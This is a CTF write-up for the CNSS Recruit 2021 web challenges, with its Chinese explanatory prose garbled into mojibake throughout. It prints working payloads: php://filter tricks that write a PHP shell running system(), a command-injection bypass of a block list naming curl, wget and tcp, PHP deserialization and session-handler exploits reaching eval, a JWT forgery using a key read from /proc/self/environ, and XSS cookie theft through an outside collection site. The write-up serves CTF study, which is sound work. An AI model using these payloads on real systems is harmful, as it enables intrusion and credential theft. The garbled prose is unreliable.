---
title: cnss2021-webéƒ¨åˆ†
id: cnss2021-webéƒ¨åˆ†
date: 2021-10-31 12:40:30
sidebar_position: 7
---

<!-- more -->

> è¿˜å·®4é¢˜webæ²¡å†™~è¿˜æ˜¯å·®ç‚¹äº†æ
>
> æ¯”èµ›å¤§æ¦‚æ˜¯31å·ç»“æŸçš„ï¼Ÿåé¢è¿˜æƒ³ç­‰wpå¤ç°æï¼Œå¯æƒœå˜æˆéš¾å¿˜ä»Šå®µå•¦

21å·åœ¨ç¾¤é‡Œå¬å¸ˆå‚…ä»¬æåˆ°cnssï¼Œæ±‚æ¥äº†é“¾æ¥[CNSS Recruit 2021](https://recruit.cnss.io/problems)

å‘ç°å¾ˆå¤šå­¦æ ¡çš„æ‹›æ–°èµ›éƒ½æŒºæœ‰æ„æ€çš„ï¼Œä¹Ÿèƒ½å‘ç°è‡ªå·±å¹³æ—¶æ²¡æ³¨æ„åˆ°çš„çŸ¥è¯†ç‚¹

æ‰“ctfè¿˜æ˜¯å¾—å¤šåšé¢˜ï¼Œå¤šå’Œå¸ˆå‚…ä»¬äº¤æµ~



## ğŸ™‹â€ æˆ‘ä¸€å®šè¦è¯•è¯• Web æ–¹å‘

> # Web æ–¹å‘åšé¢˜é¡»çŸ¥
>
> 1. Web é¢˜ç›®ä¸ºæ¯é“é¢˜ç›®æè¿°é‡Œç»™å‡ºçš„é“¾æ¥åœ°å€æ‰€æŒ‡å‘çš„ Web åº”ç”¨
> 2. flag æ ¼å¼ç»Ÿä¸€ä¸º cnss{} èŠ±æ‹¬å·ä¸­é—´ä¸ºæœ‰æ„ä¹‰çš„å­—ç¬¦ä¸²ï¼Œé€šå¸¸ä¼šä»¥ _ åŒºåˆ†å•ä¸ªå•è¯ï¼ˆCNSS å¤§å°å†™å½¢å¼éƒ½æœ‰å¯èƒ½,æ‹¬å·å†…åŒ…è£¹çš„å†…å®¹ä¸€èˆ¬ä¼šç»è¿‡ [leet](https://zh.wikipedia.org/zh-cn/Leet) å¤„ç†ï¼‰
> 3. hint æ„ä¸ºæç¤ºï¼Œæ˜¯å‡ºé¢˜äººç»™å‡ºçš„è§£é¢˜æç¤ºï¼Œå¹¶ä¸è¦æ±‚ä½ åœ¨ flag æäº¤å¤„ä½œç­”
> 4. å½“ä½ æˆåŠŸå¾—åˆ° flag æ—¶ï¼Œflag ä¸€å®šæ˜¯ä»¥ cnss{} çš„å½¢å¼æ˜¾ç¤ºçš„ æ‰€ä»¥ä¸éœ€è¦è‡ªå·±æ‰‹åŠ¨æ·»åŠ  cnss{} (å¦‚æœæœ‰é‚£ä½ æ‰¾åˆ°çš„ä¸€å®šä¸æ˜¯ flag
>
> 
>
> ### åšé¢˜è¦æ±‚
>
> 
>
> 1. è¦ä¼šçœ‹ **HTML** æºç 
> 2. èƒ½è¯»æ‡‚ç®€å•çš„ **PHP** ä»£ç 
> 3. æ‡‚ä¸€ç‚¹ç‚¹ **HTTP** æŠ¥æ–‡
> 4. å­¦ä¼šä½¿ç”¨ **Burpsuite** çš„ **Repeater, Intruder** æ¨¡å—
>
> 
>
> ### å¸¸ç”¨å·¥å…·
>
> 
>
> 1. **[Burp Suite](https://portswigger.net/burp/releases)**
> 2. Metasploit
> 3. **AntSword**
> 4. F12 å¼€å‘è€…å·¥å…·ï¼Œæ’ä»¶å¦‚ **Hackbar** ç­‰
>
> PS: æµè§ˆå™¨è¯·ä½¿ç”¨ Firefox/Chrome
>
> 
>
> ### å­¦ä¹ å‚è€ƒ
>
> 
>
> 1. å­¦ä¼šä½¿ç”¨ **æœç´¢å¼•æ“(å°¤æŒ‡ [Google](https://www.google.com/ncr))** æœç´¢å…³é”®å­—ä»¥æ‰¾åˆ°è‡ªå·±éœ€è¦çš„å­¦ä¹ èµ„æ–™
> 2. ä»åˆ«äººçš„ **åšå®¢æ–‡ç« **/**å®˜æ–¹æ–‡æ¡£** ä¸­å­¦ä¹ 
> 3. ä¹¦ç±å’Œè§†é¢‘ä¸­å­¦åˆ°çš„å¤§å¤šæ˜¯ç³»ç»Ÿå…¨é¢çš„çŸ¥è¯†ï¼Œä½†æ˜¯ç›¸åº”çš„æ•ˆç‡ä¾¿ä½äº†
> 4. é’ˆå¯¹æ€§å­¦ä¹ å’Œç³»ç»Ÿæ€§å­¦ä¹ ï¼Œéœ€è¦æ¯ä¸ªäººç»“åˆè‡ªèº«æƒ…å†µè¿›è¡Œå‡è¡¡
>
> ```
> CNSS{VVeb_i5_v3ry_1nt3re5ting}
> ```

## [ğŸ‘¶Baby] Signin

æ”¹ç”¨postä¼ å‚å¾—åˆ°æºç 

```php
<?php
error_reporting(0);
require_once("flag.php");
if($_SERVER['REQUEST_METHOD'] !=='POST'){
    die("Please Change Your Method!");
    exit();
}else{
    if(!isset($_POST["CNSS"])){
        show_source(__FILE__);
    }
    else if($_POST["CNSS"] === "join"){
        if((isset($_GET["web"])) && (($_GET["web"]) === "like")){
            setcookie("flag","0");
            if($_COOKIE['flag'] === '1'){
                echo $flag;
            }else{show_source(__FILE__);}
        }else{
            show_source(__FILE__);
        }
    }
}

```

![](https://i.loli.net/2021/10/09/Q6XDg2vWEmenMxN.png)



## [ğŸ‘¶Baby]D3buger

ç¦ç”¨å³é”®å’Œf12ç­‰ç­‰ä¸€ç³»åˆ—æ“ä½œ

å…ˆæ‰¾ä¸ªé¡µé¢å¼€f12ï¼Œå†hackbarè®¿é—®å°±è¡Œ

flagåœ¨jsé‡Œï¼Œ
å½©è›‹æ˜¯[Never Gonna Give You Up - Rick Astley_bilibili](https://www.bilibili.com/video/BV1GJ411x7h7)

```
view-source:http://81.68.109.40:30001/js/fuck.js
```

![](https://i.loli.net/2021/10/09/rCZP2uQFV8XiEec.png)



## [ğŸ‘¶Baby]GitHacker

æ„Ÿè°¢æ·å®çš„è´¡çŒ®

Git_Extractï¼š[gakki429/Git_Extract: æå–è¿œç¨‹ git æ³„éœ²æˆ–æœ¬åœ° git çš„å·¥å…· (github.com)](https://github.com/gakki429/Git_Extract)

æŠŠ.gitç›®å½•å¼„ä¸‹æ¥

![](https://i.loli.net/2021/10/08/HSFB1U59T8Zmjwy.png)

æ‰§è¡Œfsckï¼ˆæ–‡ä»¶ç³»ç»Ÿæ£€æµ‹ï¼‰å‘½ä»¤
`git fsck --lost-found`
è¿™ä¸ªå‘½ä»¤ä¼šæŠŠæ‚¬ç©ºçš„blobæ¢å¤æ–‡ä»¶åˆ—ä¸¾å‡ºæ¥

![](https://i.loli.net/2021/10/08/4PckyLimsYEaWnF.png)

è¿™æ—¶å°±å¯ä»¥é€šè¿‡`git show 11b2d674cc83c17990150726b4653bfe3c78c807` å‘½ä»¤æŸ¥çœ‹å½“å‰å“ˆå¸Œå€¼å¯¹è±¡çš„å…·ä½“å†…å®¹

![](https://i.loli.net/2021/10/08/oSHnD35TiAbUy8m.png)







## [ğŸ˜ƒEasy]æ›´å‘çš„æ•°å­¦é¢˜

```python
import requests
import re

url = 'http://81.68.109.40:30005/'
s = requests.session()
r = s.get(url)
a = eval(re.search(r'(\d+[=\-*])+\d+', r.text).group())
print(s.post(url, data={'res': a}).text)

```





## [ğŸ˜ƒEasy]Ezp#p

```php
<?php
    error_reporting(0);
    require_once("flag.php");
    show_source(__FILE__);

    $pass = '0e0';
    $md55 = $_COOKIE['token'];
    $md55 = md5($md55);

    if(md5($md55) == $pass){
        if(isset($_GET['query'])){
            $before = $_GET['query'];
            $med = 'filter';
            $after = preg_replace(
                "/$med/", '', $before
            );
            if($after === $med){
                echo $flag1;
            }
        }
        $verify = $_GET['verify'];
    }

    extract($_POST);
    
    if(md5($verify) === $pass){
        echo $$verify;
    }


?>
```

poc

```php
<?php

$pass = '0e0';

for ($i=0;$i<=100000000000;$i++){
    $md55 = $i;
    if(md5(md5($md55)) == $pass){
        echo $i;
        exit(0);
    }
}
```

![](https://i.loli.net/2021/10/09/uzEq6QI83a7xJb4.png)

flag1ï¼šæ‰¾md5(md5(xxx))ä¸º0exxxçš„å€¼ï¼Œè¿™é‡Œç»™ä¸€ä¸ª`179122048`ï¼ŒfilteråŒå†™ç»•è¿‡

flag2ï¼šåˆ©ç”¨extractå˜é‡è¦†ç›–çš„ç‰¹æ€§ï¼Œä¼ å…¥verifyä¸ºflag2ï¼Œpassä¸ºå¯¹åº”çš„md5å€¼å³å¯

![](https://i.loli.net/2021/10/08/BGn129avm6gROwY.png)





## [ğŸ˜ƒEasy]China Flag

å¦‚ä¸‹ï¼Œå†æ¬¡æ„Ÿè°¢æ·å®ä½œå‡ºçš„è´¡çŒ®ï¼Œæˆ‘è¿˜æ˜¯æµ®èºäº†ï¼Œæ•´åˆ°xffå°±æ²¡æƒ³ç€å°è¯•äº†==

![](https://i.loli.net/2021/10/08/fcWze493Sos5LvQ.png)

## [ğŸ˜®Mid]å¤ªææŒé—¨äºº

```php
<?php
    error_reporting(0);
    show_source(__FILE__);

    function deleteDir($path) {

        if (is_dir($path)) {
            $dirs = scandir($path);
            foreach ($dirs as $dir) {
                if ($dir != '.' && $dir != '..') {
                    $sonDir = $path.'/'.$dir;
                    if (is_dir($sonDir)) {

                        deleteDir($sonDir);

                        @rmdir($sonDir);

                    } elseif ($sonDir !== './index.php'
                            && $sonDir !== './flag.php') {

                        @unlink($sonDir);

                    }
                }
            }
            @rmdir($path);
        }
    }

    $devil = '<?php exit;?>';

    $goods = $_POST['goods'];

    file_put_contents($_POST['train'], $devil . $goods);

    sleep(1);

    deleteDir('.');

?>
```

å‚è€ƒæ–‡ç« ï¼š

1. [`<?php exit;?>`ç»•è¿‡ - cooyf's blog](https://www.cooyf.com/notes/php_exit.html)
2. [è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ | ç¦»åˆ«æ­Œ (leavesongs.com)](https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=1#_2)
2. [æ¢ç´¢phpä¼ªåè®®ä»¥åŠæ­»äº¡ç»•è¿‡ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·](https://www.freebuf.com/articles/web/266565.html)

### è§£æ³•1ï¼šbase64ç¼–ç ä¸è§£ç 

åŸç†æ˜¯base64ä¸ä¼šè§£ç `<` `>` `?` `;` `ç©ºæ ¼`è¿™äº›ï¼Œé‚£ä¹ˆæŠŠä»£ç base64ç¼–ç ï¼Œå†ç”¨php://filteråè®®å†™å…¥å°±è¡Œ

psï¼šæ³¨æ„base64æ˜¯ä»¥4byteä¸€ç»„è§£ç ï¼Œ`<?php exit;?>`é™¤äº†`<` `>` `?` `;` `ç©ºæ ¼`è¿™äº›ï¼Œä¸€å…±`7`ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆç»™å®ƒéšä¾¿åŠ ä¸€ä¸ªaå°±è¡Œ

payloadï¼š

```
goods=aPD9waHAgc3lzdGVtKCJjYXQgLi9mbGFnLnBocCIpOw==&train=php://filter/write=convert.base64-decode/resource=a.php
```

> å¦‚ä¸Šç”Ÿæˆçš„ä»£ç å°±ä¼šæ˜¯ï¼š
>
> ```
> <?php exit;?>aPD9waHAgc3lzdGVtKCJjYXQgLi9mbGFnLnBocCIpOw==
> 
> ç„¶åbase64è§£ç åå†™å…¥a.phpé‡Œ
> ï¼ˆæˆ‘å†™çš„æ˜¯<?php system("cat ./flag.php");ï¼‰
> ```
>
> 



### è§£æ³•2ï¼šstrip_tags()å­—ç¬¦ä¸²æ“ä½œå‡½æ•°

> ```
> strip_tags	(PHP 4, PHP 5, PHP 7, PHP 8)
> 
> strip_tags â€” ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°
> ```
>
> `<?php exit; ?>`å®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾ï¼Œæ—¢ç„¶æ˜¯XMLæ ‡ç­¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°å»é™¤å®ƒï¼Œè€Œphp://filteråˆšå¥½æ˜¯æ”¯æŒè¿™ä¸ªæ–¹æ³•çš„ã€‚

è·Ÿç€Pç¥çš„æ–‡ç« æµ‹è¯•ä¸€ä¸‹ï¼š

```php
<?php 
echo readfile('php://filter/read=string.strip_tags/resource=php://input');
```

å¯ä»¥çœ‹åˆ°ä¼ å…¥çš„`<?php exit; ?>`å·²ç»è¢«å»é™¤äº†
ä½†æˆ‘ä»¬è¦å†™å…¥çš„ä¸€å¥è¯ä¹Ÿæ˜¯phpä»£ç ï¼Œå¦‚æœä½¿ç”¨äº†strip_tagsï¼Œä¸€å¥è¯åŒæ ·ä¼šè¢«å»é™¤æ‰![](https://i.loli.net/2021/11/03/AuDo9EZseJvdVPX.png)

ä¸è¿‡`php://filter`å…è®¸ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œåªéœ€è¦ä½¿ç”¨`|`é—´éš”å¼€æ¥å°±å¥½
å…ˆç”¨`strip_tags`å»é™¤`<?php exit; ?>`ï¼Œå†ç”¨base64-decodeè§£ç å’±ä»¬ä¼ å…¥çš„base64ç¼–ç åçš„ä¸€å¥è¯

payloadï¼š

```php
goods=PD9waHAgc3lzdGVtKCJjYXQgLi9mbGFnLnBocCIpOw==&train=php://filter/write=string.strip_tags|convert.base64-decode/resource=a.php
```

### è§£æ³•3ï¼šstring.rot13

> `<?php exit; ?>`åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ`<?cuc rkvg; ?>`ï¼Œ
> åœ¨PHPä¸å¼€å¯short_open_tagæ—¶ï¼Œphpä¸è®¤è¯†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ç„¶ä¹Ÿå°±ä¸ä¼šæ‰§è¡Œäº†ï¼š

ç”¨çš„æ˜¯è¿‡æ»¤å™¨`string.rot13`ï¼Œ
éœ€è¦phpä¸å¼€å¯çŸ­æ ‡ç­¾ï¼ˆshort_open_tagï¼‰å³`php.iniä¸­short_open_tag = Off`

```
goods=PD9waHAgc3lzdGVtKCJjYXQgLi9mbGFnLnBocCIpOw==&train=php://filter/write=string.rot13/resource=a.php
```



### æ‹¿flag

å› ä¸ºä¼šåˆ æ‰å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥å¾—æ¡ä»¶ç«äº‰è®¿é—®ï¼Œä¸Šé¢çš„payloadéƒ½å¯ä»¥ç”¨

postï¼Œç„¶åbpæŠ“åŒ…ï¼Œçˆ†ç ´æ¨¡å—ç–¯ç‹‚é‡å‘åŒ…~

![](https://i.loli.net/2021/10/08/2KLtoVPuF39v7US.png)

è®¿é—®a.phpï¼ŒæŸ¥çœ‹æºä»£ç 

![](https://i.loli.net/2021/10/08/lyCt7Gp3vkDThoJ.png)





## [ğŸ˜®Mid]BlackPage

```
<!-- \<\?phps
$file = $_GET["file"];
$blacklist = "(**blacklist**)";
if (preg_match("/".$blacklist."/is",$file) == 1){
  exit("Nooo,You can't read it.");
}else{
  include $file;
}
//ä½ èƒ½è¯»åˆ° mybackdoor.php å—ï¼Ÿ

---->
```

ä¼ªåè®®è¯»mybackdoor.php

```
http://121.41.7.149:65002/?file=php://filter/convert.base64-encode/resource=mybackdoor.php
```

å¾—åˆ°mybackdoor.phpæºç ï¼š

```php
<?php
error_reporting(0);
function blacklist($cmd){
  $filter = "(\\<|\\>|Fl4g|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|Ã—|flag|ph|hp|wget|type|ty|\\$\\{IFS\\}|index|\\*)";
  if (preg_match("/".$filter."/is",$cmd)==1){  
      exit('Go out! This black page does not belong to you!');
  }
  else{
    system($cmd);
  }
}
blacklist($_GET['cmd']);
?>
```

`''`ç»•è¿‡å…³é”®å­—è¿‡æ»¤ã€`%09`(åˆ¶è¡¨ç¬¦)ç»•è¿‡ç©ºæ ¼ã€å ä½ç¬¦`?`åŒ¹é…

payloadï¼š

```
http://121.41.7.149:65002/mybackdoor.php?cmd=ca''t%09/Fl??????????
```



## [ğŸ˜¯Mid]bestLanguage

```php
<?php

error_reporting(0);

class superGate{
    public $gay = true;

    function __destruct(){
        echo file_get_contents("/flag");
        die();
    }
}

$p = $_GET['p'];
$honey = unserialize($p);
if(preg_match("/superGate/i", serialize($honey))){
    echo "no";
    throw Exception();
}

show_source(__FILE__);
```

superGateæ˜¯è‚¯å®šè¦çš„--ï¼Œä½†æ˜¯ä¼šè§¦å‘`throw Exception();`æŠ›å‡ºå¼‚å¸¸ä»è€Œåœæ­¢æ‰§è¡Œä»£ç 

å…ˆæœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼ŒæŠ¥é”™æ˜¯`è°ƒç”¨äº†æœªå®šä¹‰çš„å‡½æ•° Exception()`

![](https://i.loli.net/2021/10/09/woEfjvqlybZn1iJ.png)

é‚£ä¹ˆå®šä¹‰ä¸€ä¸ªå°±è¡Œ--

pocï¼š

```php
<?php

class superGate{
    public $gay = true;
    function __construct(){
        $this->gay = new Exception("666");
    }
}

$a = new superGate();
echo serialize($a);
```

![](https://i.loli.net/2021/10/09/8vKA3COYqn4tQbc.png)



## [ğŸ˜®Mid]To_be_Admin

/readæ¥å£å¯ä»¥è¯»æ–‡ä»¶ï¼Œ/adminåˆ¤æ–­ç”¨æˆ·

ä¸€å¼€å§‹æ˜¯æƒ³jwtçš„ï¼Œä½†æ˜¯çˆ†ç ´çˆ†ä¸å‡ºæ¥å¯†é’¥ï¼ŒçŒœæµ‹æ˜¯å¾—readè¯»å–ä¸€äº›ä»€ä¹ˆ

çªç ´å£æ˜¯ï¼Œæ·å®æœåˆ°è¯´å¯ä»¥è¯»ç¯å¢ƒå˜é‡/proc/self/environ

http://121.41.7.149:65003/read?file=/proc/self/environ

å‘ç°æœ‰ä¸ªkeyï¼Œä½œä¸ºå¯†é’¥ï¼Œjwtioæ”¹å†™ä¸€ä¸‹å°±å¯

![](https://i.loli.net/2021/10/17/iw1grFnQ8dsejhP.png)

![](https://i.loli.net/2021/10/17/KvBJIyiQFgsWTMO.png)

![](https://i.loli.net/2021/10/17/ILjmdhFB45rNOki.png)







## [ğŸ˜®Mid]To_be_Admin_Again

```php
# index.php
<?php
error_reporting(0);
ini_set('session.serialize_handler','php');
session_start();
highlight_file(__FILE__);
class CNSS{
    private $username = 'guest';
    private $code = 'phpinfo();';
    public function __construct(){
        $this->username = $username;
        $this->code = $cmd;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if($this->username === 'admin'){
            eval($this->code);
        }
    }
}

// You must be interested in save.php
```

```php
<?php
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
highlight_file(__FILE__);
if (isset($_GET['cnss'])) {
    $_SESSION['cnss'] = $_GET['cnss'];
}
```

é€»è¾‘å¾ˆç®€å•ï¼Œç»•è¿‡__wakeupä½¿å¾—usernameä¸ºadminå³å¯

ä¸»è¦åˆ©ç”¨ç‚¹åœ¨äºï¼šä¸¤ä¸ªæ–‡ä»¶çš„session.serialize_handlerä¸åŒå¼•èµ·çš„ååºåˆ—åŒ–ï¼š
[å¸¦ä½ èµ°è¿›PHP sessionååºåˆ—åŒ–æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](https://xz.aliyun.com/t/6640)
[æ·±å…¥æµ…æPHPçš„sessionååºåˆ—åŒ–æ¼æ´é—®é¢˜_phpå®ä¾‹_è„šæœ¬ä¹‹å®¶ (jb51.net)](https://www.jb51.net/article/116246.htm)

æ­¥éª¤å¦‚ä¸‹ï¼š

poc:

```php
<?php

class CNSS{
    private $username = 'admin';
    private $code = 'system("cat /flag");';
}


$a = new CNSS();
echo urlencode('|'.serialize($a));
```

1. ç”Ÿæˆpayloadï¼Œè®°å¾—æ”¹å±æ€§æ•°ç›®æ¥ç»•è¿‡__wakeup
2. è®¿é—®save.phpå€ŸåŠ©cnssä¼ payloadï¼Œè®©ç½‘é¡µè·å¾—seesionæ•°æ®
3. å†ä»save.phpè·³è½¬è‡³index.phpï¼Œç¡®ä¿sessionä¸å˜ï¼Œç”±äºå¼•æ“ä¸åŒå°±ä¼šè§¦å‘ååºåˆ—åŒ–ï¼Œç„¶åå†è§¦å‘`__destruct()`æ–¹æ³•æ‰§è¡Œ`eval()`

![](https://i.loli.net/2021/10/08/w2oi6UJxeHELBjs.png)

payload:

```
http://121.41.7.149:65004/save.php?cnss=%7CO%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D
```

ç„¶åå†è®¿é—®ï¼šå³å¯è§¦å‘

```
http://121.41.7.149:65004/
```





## [ğŸ˜®Mid]To_be_Admin_Again_and_Again

æ˜æ˜¾çš„xss

xsså¹³å°å¼¹cookieè¿‡æ¥å°±å¯ä»¥

https://xss.pt/xss.php

![](https://i.loli.net/2021/10/08/r8dRa4JjG2teOIn.png)

éªŒè¯ç ç”¨è„šæœ¬è·‘ï¼š

```python
import hashlib
l = 'qwertyuiopasdfghjklzxcvbnm1234567890'
for i in l:
    for j in l:
        for k in l:
            for m in l:
                for n in l:
                    for o in l:
                        for p in l:
                            for q in l:
                                f = i + j + k + m + n + o + p + q
                                sha = hashlib.sha256(f.encode(encoding='UTF-8')).hexdigest()
                                if sha[:6] == 'bacbd7':
                                    print(f)
                                    print(sha)
                                    exit(0)
```

æ‹¿åˆ°cookieåè®¿é—®/adminå³å¯

![](https://i.loli.net/2021/10/08/c1iOpuELVd5R6vz.png)





